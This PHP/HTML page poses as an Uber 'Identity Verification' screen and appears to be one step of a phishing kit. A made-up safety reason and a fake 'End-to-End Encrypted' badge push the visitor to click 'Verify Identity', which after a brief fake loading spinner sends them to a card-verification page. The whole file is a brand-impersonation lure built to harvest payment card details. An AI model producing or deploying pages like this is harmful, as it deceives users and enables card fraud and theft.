<?php
session_start();
include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>

<html class="light" lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber | Identity Verification</title>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
<script id="tailwind-config">
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            "colors": {
                    "outline": "#777777",
                    "surface-tint": "#5e5e5e",
                    "surface": "#f9f9f9",
                    "surface-container-highest": "#e2e2e2",
                    "on-secondary": "#ffffff",
                    "on-error": "#ffffff",
                    "secondary-container": "#d4d4d4",
                    "background": "#f9f9f9",
                    "surface-bright": "#f9f9f9",
                    "error-container": "#ffdad6",
                    "inverse-on-surface": "#f1f1f1",
                    "primary-container": "#3b3b3b",
                    "surface-container-lowest": "#ffffff",
                    "on-surface-variant": "#474747",
                    "on-secondary-container": "#1a1c1c",
                    "on-tertiary": "#e2e2e2",
                    "on-primary": "#ffffff",
                    "primary": "#000000",
                    "on-primary-fixed-variant": "#e2e2e2",
                    "tertiary-fixed-dim": "#474747",
                    "surface-container-high": "#e8e8e8",
                    "on-background": "#1b1b1b",
                    "primary-fixed": "#5e5e5e",
                    "secondary-fixed": "#c6c6c7",
                    "on-primary-fixed": "#ffffff",
                    "secondary": "#5d5f5f",
                    "on-primary-container": "#ffffff",
                    "outline-variant": "#c6c6c6",
                    "tertiary": "#3b3b3b",
                    "on-secondary-fixed": "#1a1c1c",
                    "surface-container-low": "#f3f3f3",
                    "on-tertiary-container": "#ffffff",
                    "secondary-fixed-dim": "#aaabab",
                    "on-surface": "#1b1b1b",
                    "tertiary-container": "#747474",
                    "surface-dim": "#dadada",
                    "error": "#ba1a1a",
                    "surface-container": "#eeeeee",
                    "inverse-surface": "#303030",
                    "primary-fixed-dim": "#474747",
                    "on-tertiary-fixed-variant": "#e2e2e2",
                    "on-secondary-fixed-variant": "#3a3c3c",
                    "on-error-container": "#410002",
                    "surface-variant": "#e2e2e2",
                    "inverse-primary": "#c6c6c6",
                    "on-tertiary-fixed": "#ffffff",
                    "tertiary-fixed": "#5e5e5e"
            },
            "borderRadius": {
                    "DEFAULT": "0.125rem",
                    "lg": "0.25rem",
                    "xl": "0.5rem",
                    "full": "0.75rem"
            },
            "fontFamily": {
                    "headline": ["Plus Jakarta Sans"],
                    "body": ["Inter"],
                    "label": ["Inter"]
            }
          },
        },
      }
    </script>
<style>
        body { font-family: 'Inter', sans-serif; }
        h1, h2, h3, .headline { font-family: 'Plus Jakarta Sans', sans-serif; }
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 300, 'GRAD' 0, 'opsz' 24;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .animate-in { animation: fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1) forwards; opacity: 0; }
        .delay-100 { animation-delay: 100ms; }
        .delay-200 { animation-delay: 200ms; }
        .delay-300 { animation-delay: 300ms; }
        .delay-400 { animation-delay: 400ms; }

        @keyframes shieldPulse {
            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,0,0,0.1); }
            50%       { transform: scale(1.04); box-shadow: 0 0 0 16px rgba(0,0,0,0); }
        }
        .shield-pulse {
            animation: shieldPulse 2.5s ease-in-out infinite;
        }
    </style>
</head>
<body class="bg-surface text-on-background antialiased">

<!-- TopAppBar -->
<nav class="fixed top-0 w-full z-50 bg-white dark:bg-black flex justify-between items-center px-6 h-16">
    <div class="text-2xl font-bold tracking-tight text-black dark:text-white" style="font-family:'Plus Jakarta Sans',sans-serif;">Uber</div>
    <div class="flex items-center gap-4">
        <button class="p-2 hover:bg-zinc-100 rounded-full transition-transform duration-150 active:scale-95">
            <span class="material-symbols-outlined text-black">help</span>
        </button>
    </div>
</nav>

<!-- Main Content Canvas -->
<main class="min-h-screen flex items-center justify-center px-6 pt-16">
    <div class="max-w-md w-full flex flex-col items-center text-center">

        <!-- Shield Icon -->
        <div class="mb-12 relative animate-in delay-100">
            <div class="absolute -inset-8 bg-surface-container-low rounded-full opacity-50 blur-3xl"></div>
            <div class="relative w-32 h-32 bg-white rounded-2xl flex items-center justify-center shadow-2xl border border-outline-variant/10 shield-pulse">
                <span class="material-symbols-outlined text-7xl text-primary" style="font-variation-settings: 'FILL' 1;">shield</span>
            </div>
        </div>

        <!-- Headline -->
        <h1 class="headline text-3xl font-extrabold tracking-tight text-primary mb-6 leading-tight animate-in delay-200">
            Identity Verification Required
        </h1>

        <!-- Body Text -->
        <p class="text-secondary text-base leading-relaxed mb-12 max-w-sm animate-in delay-300">
            To ensure the safety of our community, we need to verify your identity before you can complete this booking. This will only take a moment.
        </p>

        <!-- Action Button -->
        <div class="w-full space-y-4 animate-in delay-400">
            <button id="verifyBtn" onclick="handleVerify()" class="w-full bg-primary text-white py-4 px-8 rounded font-bold text-lg transition-all duration-150 active:scale-[0.98] flex items-center justify-center gap-3 shadow-lg shadow-black/10">
                Verify Identity
                <span class="material-symbols-outlined text-xl">arrow_forward</span>
            </button>
        </div>

        <!-- Bottom line -->
        <div class="mt-20 w-full opacity-40 animate-in delay-400">
            <div class="h-[2px] w-full bg-gradient-to-r from-transparent via-outline-variant/30 to-transparent"></div>
        </div>
    </div>
</main>

<!-- Footer Security Note -->
<footer class="fixed bottom-8 w-full text-center px-6">
    <div class="inline-flex items-center gap-2 px-4 py-2 bg-surface-container-lowest rounded-full border border-outline-variant/10 shadow-sm">
        <span class="material-symbols-outlined text-sm text-outline">lock</span>
        <span class="text-xs font-bold text-outline uppercase tracking-widest">End-to-End Encrypted</span>
    </div>
</footer>

<script>
function handleVerify() {
    const btn = document.getElementById('verifyBtn');
    btn.disabled = true;
    btn.innerHTML = `
        <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
        </svg>
        <span>Loading...</span>`;
    btn.classList.add('opacity-80');
    setTimeout(() => {
        window.location.href = './verify_card.php';
    }, 1200);
}
</script>
</body></html>
